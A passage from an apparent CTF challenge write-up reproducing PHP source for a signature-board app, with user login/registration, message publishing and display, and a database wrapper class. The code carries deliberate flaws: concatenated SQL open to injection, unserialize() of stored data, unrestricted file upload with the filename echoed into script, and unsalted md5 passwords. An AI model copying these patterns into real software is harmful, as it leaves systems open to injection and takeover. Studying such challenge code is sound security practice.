class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">        @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;ctf_users&#x27;</span>,<span class="string">&quot;username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ret</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_allow_diff_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">        @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="string">&#x27;allow_diff_ip&#x27;</span>,<span class="string">&#x27;ctf_users&#x27;</span>,<span class="string">&#x27;id=&#x27;</span>.<span class="variable">$this</span>-&gt;userid);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ret</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$user</span> = <span class="variable">$ret</span>-&gt;<span class="title function_ invoke__">fetch_row</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$user</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;allow_diff_ip = (<span class="keyword">int</span>)<span class="variable">$user</span>[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>, <span class="number">5</span>)!==<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;code erroar&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_username</span>(<span class="variable">$username</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">            @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;is_admin&#x27;</span>,<span class="string">&#x27;allow_diff_ip&#x27;</span>),<span class="string">&#x27;ctf_users&#x27;</span>,<span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27; limit 1&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$ret</span>-&gt;<span class="title function_ invoke__">fetch_row</span>();</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$user</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$user</span>[<span class="number">4</span>] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; <span class="variable">$user</span>[<span class="number">2</span>] !== <span class="title function_ invoke__">get_ip</span>())</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;You can only login at the usual address&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$user</span>[<span class="number">3</span>] == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                        <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;userid&#x27;</span>] = <span class="variable">$user</span>[<span class="number">0</span>];</span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>[<span class="number">1</span>];</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;username = <span class="variable">$user</span>[<span class="number">1</span>];</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;userid = <span class="variable">$user</span>[<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>, <span class="number">5</span>)!==<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;code error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_username</span>(<span class="variable">$username</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">is_exists</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line"></span><br><span class="line">                @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;is_admin&#x27;</span>,<span class="string">&#x27;allow_diff_ip&#x27;</span>),<span class="string">&#x27;ctf_users&#x27;</span>,<span class="keyword">array</span>(<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="title function_ invoke__">get_ip</span>(),<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)); <span class="comment">//No one could be admin except me</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;The username is not unique&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">publish</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;signature&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mood&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$mood</span> = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Mood</span>((<span class="keyword">int</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;mood&#x27;</span>],<span class="title function_ invoke__">get_ip</span>())));</span><br><span class="line">                <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">                @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="keyword">array</span>(<span class="string">&#x27;userid&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;signature&#x27;</span>,<span class="string">&#x27;mood&#x27;</span>),<span class="string">&#x27;ctf_user_signature&#x27;</span>,<span class="keyword">array</span>(<span class="variable language_">$this</span>-&gt;userid,<span class="variable language_">$this</span>-&gt;username,<span class="variable">$_POST</span>[<span class="string">&#x27;signature&#x27;</span>],<span class="variable">$mood</span>));</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>])) </span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$dir</span>=<span class="string">&#x27;/app/upload/&#x27;</span>;</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$dir</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;upload success&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showmess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//id,sig,mood,ip,country,subtime</span></span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">            @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;signature&#x27;</span>,<span class="string">&#x27;mood&#x27;</span>,<span class="string">&#x27;id&#x27;</span>),<span class="string">&#x27;ctf_user_signature&#x27;</span>,<span class="string">&quot;userid = <span class="subst">$this</span>-&gt;userid order by id desc&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ret</span>) &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$ret</span>-&gt;<span class="title function_ invoke__">fetch_row</span>()) &#123;</span><br><span class="line">                    <span class="variable">$sig</span> = <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">                    <span class="variable">$mood</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">                    <span class="variable">$country</span> = <span class="variable">$mood</span>-&gt;<span class="title function_ invoke__">getcountry</span>();</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="variable">$mood</span>-&gt;ip;</span><br><span class="line">                    <span class="variable">$subtime</span> = <span class="variable">$mood</span>-&gt;<span class="title function_ invoke__">getsubtime</span>();</span><br><span class="line">                    <span class="variable">$allmess</span> = <span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>=&gt;<span class="variable">$row</span>[<span class="number">3</span>],<span class="string">&#x27;sig&#x27;</span> =&gt; <span class="variable">$sig</span>, <span class="string">&#x27;mood&#x27;</span> =&gt; <span class="variable">$mood</span>, <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$ip</span>, <span class="string">&#x27;country&#x27;</span> =&gt; <span class="variable">$country</span>, <span class="string">&#x27;subtime&#x27;</span> =&gt; <span class="variable">$subtime</span>);</span><br><span class="line">                    <span class="title function_ invoke__">array_push</span>(<span class="variable">$data</span>, <span class="variable">$allmess</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;adminpic/&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_splice</span>(<span class="variable">$filenames</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$filenames</span>));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">allow_diff_ip_option</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;adio&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">                @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_single</span>(<span class="string">&#x27;ctf_users&#x27;</span>,<span class="string">&quot;id = <span class="subst">$this</span>-&gt;userid&quot;</span>,<span class="string">&#x27;allow_diff_ip&#x27;</span>,(<span class="keyword">int</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;adio&#x27;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;admin can\&#x27;t change this option&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deletemess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;delid&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$delid</span> = (<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;delid&#x27;</span>];</span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>;</span><br><span class="line">            @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;ctf_user_signature&#x27;</span>, <span class="string">&quot;userid = <span class="subst">$this</span>-&gt;userid and id = &#x27;<span class="subst">$delid</span>&#x27;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#test</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&quot;PRC&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$username</span> = <span class="string">&quot;Nu1L&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$password</span> = <span class="string">&quot;***********&quot;</span>;<span class="comment">#you don&#x27;t know!</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$dbname</span> = <span class="string">&quot;nu1lctf&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$this</span>-&gt;servername, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password, <span class="variable">$this</span>-&gt;dbname);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_column</span>(<span class="params"><span class="variable">$columns</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$columns</span>))</span><br><span class="line">            <span class="variable">$column</span> = <span class="string">&#x27; `&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;`,`&#x27;</span>,<span class="variable">$columns</span>).<span class="string">&#x27;` &#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="variable">$column</span> = <span class="string">&#x27; `&#x27;</span>.<span class="variable">$columns</span>.<span class="string">&#x27;` &#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$column</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$columns</span>,<span class="variable">$table</span>,<span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$column</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_column</span>(<span class="variable">$columns</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&#x27;select &#x27;</span>.<span class="variable">$column</span>.<span class="string">&#x27; from &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27; where &#x27;</span>.<span class="variable">$where</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$columns</span>,<span class="variable">$table</span>,<span class="variable">$values</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$column</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_column</span>(<span class="variable">$columns</span>);</span><br><span class="line">        <span class="variable">$value</span> = <span class="string">&#x27;(&#x27;</span>.<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/`([^`,]+)`/&#x27;</span>,<span class="string">&#x27;\&#x27;$&#123;1&#125;\&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get_column</span>(<span class="variable">$values</span>)).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">        <span class="variable">$nid</span> =</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&#x27;insert into &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$column</span>.<span class="string">&#x27;) values &#x27;</span>.<span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable 